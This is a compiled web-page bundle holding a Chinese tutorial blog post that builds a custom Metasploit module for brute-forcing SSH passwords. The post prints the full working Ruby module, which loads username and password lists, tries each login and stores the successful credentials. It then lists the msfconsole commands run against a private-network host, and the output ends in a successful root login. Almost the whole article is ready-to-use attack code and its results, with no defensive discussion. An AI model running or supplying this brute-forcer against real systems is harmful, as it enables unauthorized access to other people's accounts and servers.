import{i as e,r as t,s as n,t as r}from"./app-DelTEiz4.js";var i=JSON.parse(`{"path":"/md/hack/tools/2022-04-17-041-Metasploit%E8%87%AA%E5%AE%9A%E4%B9%89SSH%E8%AE%A4%E8%AF%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%99%A8.html","title":"Metasploit自定义SSH认证暴力破解器","lang":"zh-CN","frontmatter":{"layout":"post","category":"binghe-code-hack","title":"Metasploit自定义SSH认证暴力破解器","tagline":"by 冰河","tag":["hack","binghe-code-hack"],"excerpt":"Metasploit自定义SSH认证暴力破解器","lock":"need"},"git":{"updatedTime":1777424513000,"contributors":[{"name":"binghe001","username":"binghe001","email":"“1028386804@qq.com”","commits":1,"url":"https://github.com/binghe001"}],"changelog":[{"hash":"c026b495e49d28d287da9a2c1001309f45377cbf","time":1777424513000,"email":"“1028386804@qq.com”","author":"binghe001","message":"feature: 升级到vuepress2"}]},"filePathRelative":"md/hack/tools/2022-04-17-041-Metasploit自定义SSH认证暴力破解器.md"}`),a={name:`2022-04-17-041-Metasploit自定义SSH认证暴力破解器.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="metasploit自定义ssh认证暴力破解器" tabindex="-1"><a class="header-anchor" href="#metasploit自定义ssh认证暴力破解器"><span>Metasploit自定义SSH认证暴力破解器</span></a></h1><p>这里，我们首先编写一个脚本ssh_brute_by_binghe.rb，具体如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">##</span>
<span class="line"># Author 冰河</span>
<span class="line"># Date 2019-01-12</span>
<span class="line"># Description 自定义SSH暴力破解模块，用于暴力破解SSH</span>
<span class="line">##</span>
<span class="line"></span>
<span class="line">require &#39;msf/core&#39;</span>
<span class="line">require &#39;metasploit/framework/credential_collection&#39;</span>
<span class="line">require &#39;metasploit/framework/login_scanner/ssh&#39;</span>
<span class="line"></span>
<span class="line">class Metasploit3 &lt; Msf::Auxiliary</span>
<span class="line">  include Msf::Auxiliary::Scanner</span>
<span class="line">  include Msf::Auxiliary::Report</span>
<span class="line">  #提供必要的暴力破解机制和功能，例如提供了单独的登录用户名和密码表，生词表、空密码等选项</span>
<span class="line">  include Msf::Auxiliary::AuthBrute</span>
<span class="line">  </span>
<span class="line">  #初始化基础信息</span>
<span class="line">  def initialize</span>
<span class="line">    super(</span>
<span class="line">      &#39;Name&#39;        =&gt; &#39;SSH Scanner&#39;,</span>
<span class="line">      &#39;Description&#39; =&gt; %q{</span>
<span class="line">        SSH Brute Tool</span>
<span class="line">      },</span>
<span class="line">      &#39;Author&#39;      =&gt; &#39;binghe&#39;,</span>
<span class="line">      &#39;License&#39;     =&gt; MSF_LICENSE</span>
<span class="line">    )</span>
<span class="line">   register_options(</span>
<span class="line">   [</span>
<span class="line">      Opt::RPORT(22)</span>
<span class="line">   ],self.class)</span>
<span class="line">   end</span>
<span class="line">   </span>
<span class="line">   def run_host(ip)</span>
<span class="line">     #cred_collection实现了按照数据存储选项来设置登录凭证</span>
<span class="line">     cred_collection = Metasploit::Framework::CredentialCollection.new(</span>
<span class="line">        blank_passwords: datastore[&#39;BLANK_PASSWORDS&#39;],</span>
<span class="line">        pass_file: datastore[&#39;PASS_FILE&#39;],</span>
<span class="line">        password: datastore[&#39;PASSWORD&#39;],</span>
<span class="line">        user_file: datastore[&#39;USER_FILE&#39;],</span>
<span class="line">        userpass_file: datastore[&#39;USERPASS_FILE&#39;],</span>
<span class="line">        username: datastore[&#39;USERNAME&#39;],</span>
<span class="line">        user_as_pass: datastore[&#39;USER_AS_PASS&#39;],</span>
<span class="line">     )</span>
<span class="line">     </span>
<span class="line">     scanner = Metasploit::Framework::LoginScanner::SSH.new(</span>
<span class="line">        host: ip,</span>
<span class="line">        port: datastore[&#39;PORT&#39;],</span>
<span class="line">        cred_details: cred_collection,</span>
<span class="line">        proxies: datastore[&#39;Proxies&#39;],</span>
<span class="line">        stop_on_success: datastore[&#39;STOP_ON_SUCCESS&#39;],</span>
<span class="line">        bruteforce_speed: datastore[&#39;BRUTEFORCE_SPEED&#39;],</span>
<span class="line">        connection_timeout: datastore[&#39;SSH_TIMEOUT&#39;],</span>
<span class="line">        framework: framework,</span>
<span class="line">        framework_module: self,</span>
<span class="line">     )</span>
<span class="line">     </span>
<span class="line">     #使用.scan实现扫描的初始化，它将完成所有的登录尝试</span>
<span class="line">     scanner.scan! do |result|</span>
<span class="line">        #to_h 将数据转换成哈希格式</span>
<span class="line">        credential_data = result.to_h</span>
<span class="line">        #将名字和工作区id合并到credential_data变量中</span>
<span class="line">        credential_data.merge!(</span>
<span class="line">            module_fullname: self.fullname,</span>
<span class="line">            workspace_id: myworkspace_id</span>
<span class="line">        )</span>
<span class="line">        </span>
<span class="line">        #登录凭证正确，保存到数据库，并打印信息</span>
<span class="line">        if result.success?</span>
<span class="line">          credential_core = create_credential(credential_data)</span>
<span class="line">          credential_data[:core] = credential_core</span>
<span class="line">          create_credential_login(credential_data)</span>
<span class="line">          </span>
<span class="line">          print_good &quot;#{ip} - LOGIN SUCCESSFUL: #{result.credential}&quot;</span>
<span class="line">          </span>
<span class="line">        #登录凭证不正确，将credential_data传入到invalidate_login方法，并打印信息</span>
<span class="line">        else</span>
<span class="line">          invalidate_login(credential_data)</span>
<span class="line">          print_status &quot;#{ip} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})&quot;</span>
<span class="line">        end</span>
<span class="line">      end     </span>
<span class="line">   end</span>
<span class="line">end</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>接下来我们将ssh_brute_by_binghe.rb上传到Kali的/usr/share/metasploit-framework/modules/auxiliary/scanner/ssh目录下。</p><p>在运行这个脚本之前，我们先使用Metasploit中的msftidy工具检查一下此脚本的语法是否正确。</p><p>在Kali的命令行执行如下命令：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">/usr/share/metasploit-framework/tools/dev/msftidy.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/ssh/ssh_brute_by_binghe.rb </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>未输出任何信息，证明脚本正确。</p><p>接下来，我们在msf终端运行ssh_brute_by_binghe.rb脚本</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msfconsole</span>
<span class="line">set RHOSTS 192.168.109.159</span>
<span class="line">set USER_FILE /root/user</span>
<span class="line">set PASS_FILE /root/pass</span>
<span class="line">run</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>最终输出结果为：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">[*] 192.168.109.159 - LOGIN FAILED: root:admin (Incorrect: )</span>
<span class="line">[+] 192.168.109.159 - LOGIN SUCCESSFUL: root:admin123</span>
<span class="line">[*] 192.168.109.159 - LOGIN FAILED: admin:123456 (Incorrect: )</span>
<span class="line">[*] 192.168.109.159 - LOGIN FAILED: admin:admin (Incorrect: )</span>
<span class="line">[*] 192.168.109.159 - LOGIN FAILED: admin:binghe (Incorrect: )</span>
<span class="line">[*] 192.168.109.159 - LOGIN FAILED: binghe:123456 (Incorrect: )</span>
<span class="line">[*] 192.168.109.159 - LOGIN FAILED: binghe:admin (Incorrect: )</span>
<span class="line">[*] 192.168.109.159 - LOGIN FAILED: binghe:binghe (Incorrect: )</span>
<span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span>
<span class="line">[*] Auxiliary module execution completed</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="写在最后" tabindex="-1"><a class="header-anchor" href="#写在最后"><span>写在最后</span></a></h2><blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906013715889.png" alt=""></p>`,15)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};